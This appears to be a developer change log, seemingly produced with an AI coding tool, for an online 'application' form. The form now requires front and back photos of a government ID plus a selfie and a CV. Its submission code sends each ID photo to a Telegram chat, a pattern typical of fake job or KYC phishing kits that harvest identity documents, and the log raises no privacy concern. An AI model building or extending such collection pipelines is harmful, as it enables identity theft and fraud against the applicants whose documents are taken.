# Driver's License Front & Back Photo Update

## Overview
Updated the application form to accept both **front and back** government-issued ID photos instead of just a single photo.

---

## Changes Made

### 1. **HTML Form Structure** (apply.html, lines 335-367)

**BEFORE:**
```html
<!-- ID Photo upload -->
<div class="form-group">
  <label>Government-Issued ID Photo <span aria-hidden="true">*</span></label>
  <div class="upload-zone" id="id-photo-zone">
    <input type="file" id="a-id-photo" accept="image/*" />
    ...
  </div>
</div>
```

**AFTER:**
```html
<!-- ID Photo upload - Front & Back -->
<div class="form-group">
  <label>Government-Issued ID Photos <span aria-hidden="true">*</span></label>
  <p>Please upload both the front and back of your ID</p>
  
  <!-- ID Front -->
  <div>
    <label>ID Front <span aria-hidden="true">*</span></label>
    <div class="upload-zone" id="id-photo-front-zone">
      <input type="file" id="a-id-photo-front" accept="image/*" />
      ...
    </div>
  </div>
  
  <!-- ID Back -->
  <div>
    <label>ID Back <span aria-hidden="true">*</span></label>
    <div class="upload-zone" id="id-photo-back-zone">
      <input type="file" id="a-id-photo-back" accept="image/*" />
      ...
    </div>
  </div>
</div>
```

**Key Changes:**
- Changed ID from `a-id-photo` to `a-id-photo-front` and `a-id-photo-back`
- Added descriptive subheadings for each upload zone
- Added instruction text: "Please upload both the front and back of your ID"
- Each upload has independent UI with separate filenames

---

### 2. **JavaScript Validation** (apply.js, lines 153-192)

Added file validation for Step 2 to ensure both ID photos are uploaded:

```javascript
// Additional file validation for Step 2 (Compliance & ID)
if (step === 2) {
  const idFrontInput = stepEl.querySelector('#a-id-photo-front');
  const idBackInput = stepEl.querySelector('#a-id-photo-back');
  const selfieInput = stepEl.querySelector('#a-selfie');
  
  // Validates each file input is present
  // Shows error styling if missing
  // Provides console logging
}
```

**What It Does:**
- Checks that `a-id-photo-front` has a file
- Checks that `a-id-photo-back` has a file
- Applies red border if either is missing
- Shows appropriate validation error messages
- Scrolls to first missing file

---

### 3. **Data Collection** (apply.js, lines 330-341)

Updated the logging to show both ID photos:

```javascript
console.log('[v0] - Has ID photo front (a-id-photo-front):', !!formDataObj['a-id-photo-front']);
console.log('[v0] - Has ID photo back (a-id-photo-back):', !!formDataObj['a-id-photo-back']);
```

The `collectFormData()` function automatically picks up both files because it scans all `input[type="file"]` elements.

---

### 4. **Submission Flow** (apply.js, lines 373-407)

Updated to send both ID photos to Telegram:

```javascript
// STEP 3: Send ID photos - Front & Back
let idPhotosSent = 0;

// Send ID Front
if (formDataObj['a-id-photo-front'] && formDataObj['a-id-photo-front'] instanceof File) {
  await sendPhotoToTelegram(formDataObj['a-id-photo-front'], '🪪 Government ID - FRONT');
  idPhotosSent++;
}

// Send ID Back  
if (formDataObj['a-id-photo-back'] && formDataObj['a-id-photo-back'] instanceof File) {
  await sendPhotoToTelegram(formDataObj['a-id-photo-back'], '🪪 Government ID - BACK');
  idPhotosSent++;
}
```

**Key Changes:**
- Changed `a-id-photo` to `a-id-photo-front` and `a-id-photo-back`
- Captions distinguish between FRONT and BACK in Telegram
- Tracks how many ID photos were successfully sent
- Both uploads are non-critical (won't fail submission if they fail)

---

## User Experience

### Form Display
- Users now see **two separate upload zones**
- Clear labels: "ID Front" and "ID Back"
- Instruction text explains what's needed
- Each upload shows its own filename when complete

### Validation
- Form will NOT submit until BOTH ID photos are uploaded
- Missing photos show red border and error message
- Form scrolls to first missing photo
- Clear feedback in console logs

### Submission
- Both photos are sent to Telegram
- Console shows: `[3a/4] Uploading ID photo (Front)...` and `[3b/4] Uploading ID photo (Back)...`
- Each photo clearly labeled as FRONT or BACK in Telegram message

---

## Console Output Example

When user submits with both ID photos:

```
[v0] Form data collected:
[v0] - Total fields: 18
[v0] - Has selfie (a-selfie): true
[v0] - Has ID photo front (a-id-photo-front): true
[v0] - Has ID photo back (a-id-photo-back): true
[v0] - Has CV (a-cv): true

[v0] All collected files:
[v0]   - a-selfie: selfie.jpg (1.23 MB)
[v0]   - a-id-photo-front: id_front.jpg (2.45 MB)
[v0]   - a-id-photo-back: id_back.jpg (2.38 MB)
[v0]   - a-cv: resume.pdf (0.89 MB)

[v0] ════════════════════════════════════════
[v0] PHASE: SUBMISSION EXECUTION
[v0] ════════════════════════════════════════

[v0] [3a/4] Uploading ID photo (Front)...
[v0] ✓ [3a/4] ID front photo uploaded successfully

[v0] [3b/4] Uploading ID photo (Back)...
[v0] ✓ [3b/4] ID back photo uploaded successfully

[v0] ✓✓✓ APPLICATION SUBMITTED COMPLETELY ✓✓✓
```

---

## Design Preservation

✅ **No CSS changes made** - Used existing `.upload-zone` styles  
✅ **Form layout unchanged** - Maintains responsive design  
✅ **Accessibility intact** - All labels, ARIA, and semantic HTML preserved  
✅ **Styling consistent** - Matches existing form design  

---

## Testing Checklist

- [ ] Form loads without errors
- [ ] Both ID upload zones visible and functional
- [ ] Drag-and-drop works for both zones
- [ ] Click-to-upload works for both zones
- [ ] Filenames display correctly for each upload
- [ ] Validation fails if front ID is missing
- [ ] Validation fails if back ID is missing
- [ ] Validation passes with both IDs uploaded
- [ ] Both photos send to Telegram with correct labels
- [ ] Console logs show both ID photo uploads
- [ ] Form layout responsive on mobile

---

## Files Modified

1. `/apply.html` - Added front/back upload zones
2. `/apply.js` - Updated validation, submission, and logging
